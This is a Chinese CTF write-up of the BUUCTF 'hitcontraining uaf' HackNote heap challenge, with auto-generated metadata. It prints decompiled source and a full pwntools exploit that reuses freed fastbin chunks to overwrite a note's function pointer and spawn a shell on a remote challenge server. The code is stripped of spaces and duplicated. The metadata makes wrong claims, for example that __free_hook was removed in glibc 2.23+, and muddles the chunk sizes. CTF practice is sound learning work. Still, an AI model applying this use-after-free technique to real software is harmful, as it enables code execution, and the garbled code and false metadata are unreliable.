---
title: Buuctf 刷题记录 - hitcontraining uaf
contest: hitcontraining
year: 2018
difficulty: easy
vuln_type: heap
tags:
- HackNote 菜单
- notelist 指针数组
- print_note_content 函数指针
- magic system /bin/sh
- free 没置 NULL
- 0x18 fastbin 复用
- UAF print_note_content
attack_chain:
- '菜单 1/2/3/4: add/del/print/exit'
- 'add_note: notelist[i] = malloc(8), notelist[i][0] = print_note_content, notelist[i][1] = malloc(size)'
- 'del_note: free(notelist[i][1]); free(notelist[i]); 不置 NULL'
- '0x18 fastbin: add 0x8 + add 0x8 + add 0x18, free(1) free(2)'
- 'fastbin: 0x18 free list = [2, 1]'
- add(0x8, p32(magic)) → 拿到 0x18 fastbin 头 → notelist[1] = magic
- print(1) → 触发 magic() = system("/bin/sh")
key_payload: '''HackNote 0x8 chunk + 0x18 fastbin 复用 / free 双 chunk 不置 NULL / add(0x8, p32(magic)) 覆盖 print_note_content / print(1) 触发 system("/bin/sh")'''
one_liner: hitcontraining uaf — HackNote 堆菜单 free 双 chunk 不置 NULL + 0x18 fastbin 复用 + add(0x8, p32(magic)) 覆盖 print_note_content + print(1) 触发 system("/bin/sh")。
lesson: UAF 经典题型:0x8 note struct (含 func ptr) + 0x18 content, free 不置 NULL 让 fastbin 复用,新 add 用 p32(magic) 覆盖 func ptr;print 触发 RCE。
quality: high
full_path: Buuctf刷题记录-hitcontraining_uaf.full.md
meta_path: Buuctf刷题记录-hitcontraining_uaf.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: Buuctf 刷题记录 - hitcontraining uaf。hitcontraining uaf — HackNote 堆菜单 free 双 chunk 不置 NULL + 0x18 fastbin 复用 + add(0x8, p32(magic)) 覆盖 print_note_content + print(1) 触发 system("/bin/sh")。。关键路径：菜单 1/2...
category: pwn
subcategory: heap_exploitation
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/285744.html
reasoning_chain:
- '[触发点] HackNote 菜单 add/del/print/exit → 假设：经典 UAF / [动作] 反编译看 add_note + del_note / [观察] notelist[i] = malloc(8) + notelist[i][0] = print_note_content + notelist[i][1] = malloc(size) / [下一步] 看 del_note'
- '[触发点] del_note: free(notelist[i][1]); free(notelist[i]); 不置 NULL → 假设：fastbin 双 chunk 不置 NULL 可复用 / [动作] add(0x8) + add(0x8) + add(0x18) / [观察] 0x18 fastbin 准备 / [下一步] free'
- '[触发点] free(1) free(2) → fastbin 0x18 list = [2, 1] → 假设：add(0x8, p32(magic)) 拿到 0x18 fastbin 头 / [动作] add(0x8, p32(magic)) / [观察] notelist[1] = magic / [下一步] print(1)'
- '[触发点] print(1) 触发 magic() = system("/bin/sh") → 假设：直接 RCE / [动作] print(1) / [观察] /bin/sh 弹出 / [下一步]'
failed_attempts:
- 试图覆盖 __free_hook → 失败：glibc 2.23+ 已移除 hook
- 试图 tcache 复用 → 失败：题目是 0x18 fastbin
key_observations:
- UAF 经典题型：0x8 note struct (含 func ptr) + 0x18 content, free 不置 NULL 让 fastbin 复用
- 新 add 用 p32(magic) 覆盖 func ptr
- print 触发 RCE
- func ptr 字段（notelist[i][0]）是覆盖点
prerequisites:
- glibc heap 基础（chunk 结构 / fastbin / fd bk 指针）
- UAF 漏洞原理
- pwntools 基本使用
- 函数指针覆盖技巧
---
# Buuctf刷题记录-hitcontraining_uaf

> 原文: https://www.ctfiot.com/285744.html
> ID: 285744

1.看保护

2.看源码

int__cdecl __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[4];// [esp+0h] [ebp-Ch] BYREFint*p_argc;// [esp+4h] [ebp-8h] p_argc = &argc;setvbuf(stdout,0,2,0);setvbuf(stdin,0,2,0);while(1) {while(1) {menu();read(0, buf,4u); v3 =atoi(buf);if( v3 !=2)break;del_note(); }if( v3 >2) {if( v3 ==3) {print_note(); }else {if( v3 ==4)exit(0);LABEL_13:
puts("Invalid choice"); } }else {if( v3 !=1)gotoLABEL_13;add_note(); } }}

intmenu(){puts("----------------------");puts(" HackNote ");puts("----------------------");puts(" 1. Add note ");puts(" 2. Delete note ");puts(" 3. Print note ");puts(" 4. Exit ");puts("----------------------");returnprintf("Your choice :");}

intadd_note(){intresult;// eaxintv1;// esicharbuf[8];// [esp+0h] [ebp-18h] BYREFsize_tsize;// [esp+8h] [ebp-10h]inti;// [esp+Ch] [ebp-Ch] result = count;if( count >5)returnputs("Full");for( i =0; i <=4; ++i ) { result = *((_DWORD *)¬elist + i);if( !result ) { *((_DWORD *)¬elist + i) =malloc(8u);if( !*((_DWORD *)¬elist + i) ) {puts("Alloca Error");exit(-1); } **((_DWORD **)¬elist + i) = print_note_content;printf("Note size :");read(0, buf,8u); size =atoi(buf); v1 = *((_DWORD *)¬elist + i); *(_DWORD *)(v1 +4) =malloc(size);if( !*(_DWORD *)(*((_DWORD *)¬elist + i) +4) ) {puts("Alloca Error");exit(-1); }printf("Content :");read(0, *(void**)(*((_DWORD *)¬elist + i) +4), size);puts("Success !");return++count; } }returnresult;}

intdel_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result ) {free(*(void**)(*((_DWORD *)¬elist + v2) +4));free(*((void**)¬elist + v2));returnputs("Success"); }returnresult;}

intprint_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result )return(**((int(__cdecl ***)(_DWORD))¬elist + v2))(*((_DWORD *)¬elist + v2));returnresult;}

intmagic(){returnsystem("/bin/sh");}

3.利用思路

add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')

delete(1)delete(2)

payload = p32(magic)add(0x8,payload)print(1)

4.EXP

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./hacknote')#gdb.attach(io,"b *0x08048A75")elf = ELF("./hacknote")io=remote("node5.buuoj.cn",25034)defadd(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Note size :") io.send(str(size).encode()) io.recvuntil(b"Content :") io.send(payload)defdelete(index): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode())defprint(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())magic = elf.symbols["magic"]add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')delete(1)delete(2)payload = p32(magic)add(0x8,payload)print(1)io.interactive()

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

从ANGR-CTF项目入手ANGR和符号执行技术

AI时代-逆向工作者该如何用好这一利器

EXIF解析缓冲区溢出漏洞分析与利用

从C到Pwn：栈溢出漏洞利用实战入门

Android-ARM64的VMP分析和还原

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__cdecl __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[4];// [esp+0h] [ebp-Ch] BYREFint*p_argc;// [esp+4h] [ebp-8h] p_argc = &argc;setvbuf(stdout,0,2,0);setvbuf(stdin,0,2,0);while(1) {while(1) {menu();read(0, buf,4u); v3 =atoi(buf);if( v3 !=2)break;del_note(); }if( v3 >2) {if( v3 ==3) {print_note(); }else {if( v3 ==4)exit(0);LABEL_13:
puts("Invalid choice"); } }else {if( v3 !=1)gotoLABEL_13;add_note(); } }}
intmenu(){puts("----------------------");puts(" HackNote ");puts("----------------------");puts(" 1. Add note ");puts(" 2. Delete note ");puts(" 3. Print note ");puts(" 4. Exit ");puts("----------------------");returnprintf("Your choice :");}
intadd_note(){intresult;// eaxintv1;// esicharbuf[8];// [esp+0h] [ebp-18h] BYREFsize_tsize;// [esp+8h] [ebp-10h]inti;// [esp+Ch] [ebp-Ch] result = count;if( count >5)returnputs("Full");for( i =0; i <=4; ++i ) { result = *((_DWORD *)¬elist + i);if( !result ) { *((_DWORD *)¬elist + i) =malloc(8u);if( !*((_DWORD *)¬elist + i) ) {puts("Alloca Error");exit(-1); } **((_DWORD **)¬elist + i) = print_note_content;printf("Note size :");read(0, buf,8u); size =atoi(buf); v1 = *((_DWORD *)¬elist + i); *(_DWORD *)(v1 +4) =malloc(size);if( !*(_DWORD *)(*((_DWORD *)¬elist + i) +4) ) {puts("Alloca Error");exit(-1); }printf("Content :");read(0, *(void**)(*((_DWORD *)¬elist + i) +4), size);puts("Success !");return++count; } }returnresult;}
intdel_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result ) {free(*(void**)(*((_DWORD *)¬elist + v2) +4));free(*((void**)¬elist + v2));returnputs("Success"); }returnresult;}
intprint_note(){intresult;// eaxcharbuf[4];// [esp+8h] [ebp-10h] BYREFintv2;// [esp+Ch] [ebp-Ch]printf("Index :");read(0, buf,4u); v2 =atoi(buf);if( v2 <0|| v2 >= count ) {puts("Out of bound!"); _exit(0); } result = *((_DWORD *)¬elist + v2);if( result )return(**((int(__cdecl ***)(_DWORD))¬elist + v2))(*((_DWORD *)¬elist + v2));returnresult;}
intmagic(){returnsystem("/bin/sh");}
add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')
delete(1)delete(2)
payload = p32(magic)add(0x8,payload)print(1)
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./hacknote')#gdb.attach(io,"b *0x08048A75")elf = ELF("./hacknote")io=remote("node5.buuoj.cn",25034)defadd(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Note size :") io.send(str(size).encode()) io.recvuntil(b"Content :") io.send(payload)defdelete(index): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode())defprint(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())magic = elf.symbols["magic"]add(0x8,b'aaa')add(0x8,b'aaa')add(0x18,b'aaa')delete(1)delete(2)payload = p32(magic)add(0x8,payload)print(1)io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]